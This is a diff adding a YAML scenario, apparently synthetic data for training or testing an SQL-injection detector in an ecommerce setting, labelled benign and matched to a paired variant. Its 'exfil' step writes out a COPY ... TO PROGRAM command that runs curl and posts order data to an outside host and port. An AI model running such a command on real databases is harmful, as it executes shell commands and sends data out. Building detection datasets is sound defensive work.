@@ -1,0 +1,32 @@
+scenario_id: gen_ecommerce_27_sql_injection_ben_730b
+family_id: gen_ecommerce_27_sql_injection_fam_730
+domain: ecommerce
+time_of_day: '11:40'
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: inject
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: probe
+    sql: SELECT order_item_id, quantity FROM order_items WHERE order_id = 83309
+  - step_id: exfil
+    sql: COPY (SELECT order_item_id, quantity FROM order_items WHERE status = 'pending')
+      TO PROGRAM 'curl -sX POST https://clearinghouse-batch.example/ingest -d @-'
+    connects_to:
+      ip: 203.0.113.209
+      port: 9001
+matched_pair_id: gen_ecommerce_27_sql_injection_pair_730
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
